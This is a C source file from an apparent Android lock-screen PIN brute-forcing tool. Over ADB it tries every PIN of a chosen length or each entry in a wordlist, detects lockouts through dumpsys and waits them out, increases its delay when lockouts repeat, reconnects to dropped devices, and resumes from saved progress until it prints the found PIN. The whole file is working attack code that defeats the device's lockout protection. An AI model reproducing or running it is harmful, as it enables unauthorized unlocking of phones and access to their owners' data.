#define _GNU_SOURCE
#include "brute.h"
#include "adb.h"
#include "adb_native.h"
#include "util.h"
#include "pincrack.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <ctype.h>
#include <pthread.h>

static volatile int keep_running = 1;
static volatile int found_flag = 0;
static volatile long global_progress = 0;
static char found_pin[32] = {0};

static void sigint_handler(int sig) {
    (void)sig;
    keep_running = 0;
}

static int try_pin(const char *pin) {
    if (adb_enter_pin_sakti(pin)) return 1;
    adb_enter_pin(pin);
    return adb_is_unlocked();
}

static int detect_lockout_wait(void) {
    char tmp[1024];
    /* Use native ADB shell without "adb" prefix */
    if (adb_native_shell("dumpsys lock_settings 2>/dev/null | grep -iE 'lockout|failed'",
                         tmp, sizeof(tmp)) == 0 && strlen(tmp) == 0) {
        adb_native_shell("dumpsys locksettings 2>/dev/null | grep -iE 'lockout|failed'",
                         tmp, sizeof(tmp));
    }
    if (strstr(tmp, "lockout")) {
        int sec = 30;
        char *p = strstr(tmp, "lockout");
        char *q = strchr(p, '=');
        if (q) {
            q++;
            while (*q && *q == ' ') q++;
            if (isdigit(*q)) sec = atoi(q);
        }
        if (sec > 0 && sec < 3600) {
            printf(YELLOW "\n  [!] Lockout! Waiting %ds..." RESET, sec);
            fflush(stdout);
            for (int i = 0; i < sec && keep_running; i++) { sleep(1); printf("."); fflush(stdout); }
            printf("\n");
            return 1;
        }
    }
    if (strstr(tmp, "failed")) {
        char *p = strstr(tmp, "failed");
        while (p && *p) {
            if (isdigit(*(p+7)) || (*(p+7)==' ' && isdigit(*(p+8)))) {
                int fcnt = 0;
                p += 7;
                while (*p == ' ') p++;
                while (isdigit(*p)) { fcnt = fcnt * 10 + (*p - '0'); p++; }
                if (fcnt > 7) {
                    printf(YELLOW "\n  [!] %d failed attempts, pausing..." RESET, fcnt);
                    fflush(stdout);
                    return 1;
                }
                break;
            }
            p = strstr(p+1, "failed");
        }
    }
    return 0;
}

/* ── Non-blind display: show lock screen info periodically ── */
static void show_screen_state(void) {
    static int counter = 0;
    counter++;
    if (counter % 10 != 0) return; /* only show every 10 attempts */
    char state[256];
    adb_lock_screen_info(state, sizeof(state));
    if (state[0]) {
        printf("\n\033[K[SCREEN] %s\n", state);
    }
}

int brute_pin(int digits, int delay_ms, long start, long end, int resume, int skip_confirm) {
    if (digits == 99) {
        DeviceInfo tmp_info;
        memset(&tmp_info, 0, sizeof(tmp_info));
        return brute_smart(&tmp_info, 4, delay_ms);
    }

    long total = 1;
    for (int i = 0; i < digits; i++) total *= 10;
    long s = (start >= 0 && start < total) ? start : 0;
    long e = (end > 0 && end <= total) ? end : total;

    if (resume) {
        long t;
        long r = load_state(&t);
        if (r >= s && r < e) s = r;
    }

    printf("\n[*] %d-digit: %0*ld - %0*ld = %ld PINs | Delay: %dms\n",
           digits, digits, s, digits, e-1, e-s, delay_ms);
    if (!skip_confirm) {
        if (!yes_no("[*] Launch attack? [y/n]: ")) return 0;
    }

    signal(SIGINT, sigint_handler);
    double t0 = (double)clock() / CLOCKS_PER_SEC;

    char pin_buf[32];
    long last_save = -1;
    int consecutive_fail = 0;
    int lockout_phase = 0;

    for (long i = s; i < e && keep_running && !found_flag; i++) {
        global_progress = i;
        snprintf(pin_buf, sizeof(pin_buf), "%0*ld", digits, i);

        int st = adb_state();
        if (st < 2) {
            printf(YELLOW "\n[!] ADB lost (state=%d). Reconnecting..." RESET "\n", st);
            adb_init();
            int waited = 0;
            while (waited < 15 && adb_state() < 2) { sleep(2); waited += 2; }
            if (adb_state() < 2) {
                printf(RED "\n[-] Device gone. Aborting." RESET "\n");
                break;
            }
            printf("[+] Reconnected.\n");
        }

        if ((i - s) % 10 == 0 && i > s) {
            if (detect_lockout_wait() > 0) {
                lockout_phase++;
                if (lockout_phase > 5) {
                    printf(YELLOW "\n[!] Repeated lockouts. Increasing delay..." RESET "\n");
                    delay_ms = (delay_ms < 5000) ? delay_ms + 500 : delay_ms;
                    lockout_phase = 0;
                }
            }
            show_screen_state();
        }

        if (try_pin(pin_buf)) {
            found_flag = 1;
            strncpy(found_pin, pin_buf, sizeof(found_pin) - 1);
            break;
        }

        consecutive_fail++;
        if (consecutive_fail % 50 == 0) {
            usleep(500000);
        }

        if (delay_ms > 0) usleep(delay_ms * 1000);

        double elapsed = (double)clock() / CLOCKS_PER_SEC - t0;
        long total_range = e - s;
        double pct = (double)(i - s) / total_range * 100.0;
        double rate = (elapsed > 0) ? (i - s) / elapsed : 0;
        double eta = (rate > 0) ? (total_range - (i - s)) / rate : 0;
        char eta_str[32];
        if (eta >= 3600) snprintf(eta_str, sizeof(eta_str), "%.1fh", eta/3600);
        else if (eta >= 60) snprintf(eta_str, sizeof(eta_str), "%.1fm", eta/60);
        else snprintf(eta_str, sizeof(eta_str), "%.0fs", eta);
        int bw = 20, fill = (int)(bw * pct / 100.0);
        if (fill > bw) fill = bw;
        printf("\r[");
        for (int j = 0; j < bw; j++) putchar(j < fill ? '=' : ' ');
        printf("] %5.1f%% | %s | %4.0f/s | ETA %s | %ld/%ld  ", pct, pin_buf, rate, eta_str, i - s, total_range);
        fflush(stdout);
        if (i - last_save >= 100) { save_state(i, total); last_save = i; }
    }
    printf("\n");

    if (found_flag) {
        printf("\n" GREEN "[!!!] PIN FOUND: %s" RESET "\n", found_pin);
        save_state(0, 0);
        return 1;
    }
    printf("\n" YELLOW "[-] PIN not found in range." RESET "\n");
    return 0;
}

int brute_wordlist(const char *path, int delay_ms, long start, long end, int resume) {
    FILE *f = fopen(path, "r");
    if (!f) { fprintf(stderr, "[-] Cannot open %s\n", path); return 0; }

    char **pins = NULL;
    long count = 0;
    char buf[256];
    while (fgets(buf, sizeof(buf), f)) {
        trim_newline(buf);
        if (buf[0] == 0 || buf[0] == '#') continue;
        pins = realloc(pins, (count + 1) * sizeof(char*));
        pins[count] = strdup(buf);
        count++;
    }
    fclose(f);

    if (count == 0) { fprintf(stderr, "[-] Empty wordlist.\n"); return 0; }

    long s = (start >= 0 && start < count) ? start : 0;
    long e = (end > 0 && end <= count) ? end : count;
    if (resume) { long t; long r = load_state(&t); if (r >= s && r < e) s = r; }

    printf("\n[*] Wordlist: %ld entries | range %ld-%ld\n", count, s, e);
    if (!yes_no("[*] Launch attack? [y/n]: ")) { for (long i = 0; i < count; i++) free(pins[i]); free(pins); return 0; }

    signal(SIGINT, sigint_handler);
    double t0 = (double)clock() / CLOCKS_PER_SEC;

    int found = 0;
    for (long i = s; i < e && keep_running && !found; i++) {
        const char *pin = pins[i];
        if (detect_lockout_wait() > 0) i--;
        if (try_pin(pin)) {
            printf("\n" GREEN "[!!!] PIN FOUND: %s" RESET "\n", pin);
            save_state(0, 0);
            found = 1;
            break;
        }
        if (delay_ms > 0) usleep(delay_ms * 1000);
        double elapsed = (double)clock() / CLOCKS_PER_SEC - t0;
        print_progress(i - s, e - s, pin, elapsed);
        if ((i - s) % 10 == 0) save_state(i, count);
    }
    printf("\n");

    for (long i = 0; i < count; i++) free(pins[i]);
    free(pins);
    if (!found) printf(YELLOW "[-] PIN not found." RESET "\n");
    return found;
}
